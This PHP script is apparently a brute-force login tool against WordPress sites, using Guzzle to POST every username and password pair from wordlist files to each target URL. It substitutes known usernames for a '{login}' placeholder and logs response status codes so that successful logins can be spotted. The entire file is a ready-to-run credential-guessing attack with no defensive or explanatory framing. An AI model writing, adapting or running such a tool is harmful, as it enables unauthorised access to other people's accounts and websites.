<?php
require "vendor/autoload.php";
require "lib/functions.php";

$client = new GuzzleHttp\Client();

$verifieds   = fopen("verified.txt", 'r+') or die("File verified.txt not exists!");
$logins      = file('logins.txt') or die("File logins.txt not exists!");
$passwords   = file('passwords.txt') or die("File passwords.txt not exists!");

$logins = array_map('trimRow', $logins);
$passwords = array_map('trimRow', $passwords);

foreach ($logins as $login) {
    foreach ($passwords as $password) {

        while (false != $verified = fgets($verifieds)) {
            $url = explode(';', $verified)[0];

            if (isset(explode(";", $verified)[1])) {
                $username  = trim(explode(';', $verified)[1]);

                if ($login == '{login}')
                    $login = $username;
                if ($password == '{login}') {
                    $password = $username;
                }

            } elseif (!isset(explode(";", $verified)[1]) && ($login == "{login}" || $password == "{login}")) {
                echo "login: {$login} | password: {$password} url: {$url} | status code: continue" . PHP_EOL;
                continue;
            }

            try {
                $response = $client->request('POST', $url, [
                    'allow_redirects' => false,
                    'form_params' => [
                        'log' => $login,
                        'pwd' => $password
                    ]
                ]);
            } catch (Exception $e) {
                echo "login: {$login} | password: {$password} url: {$url} | status code: Что то пошло не так" . PHP_EOL;
            }

            echo "login: {$login} | password: {$password} url: {$url} | status code: " . $response->getStatusCode() . PHP_EOL;
        }
        rewind($verifieds);
    }
}
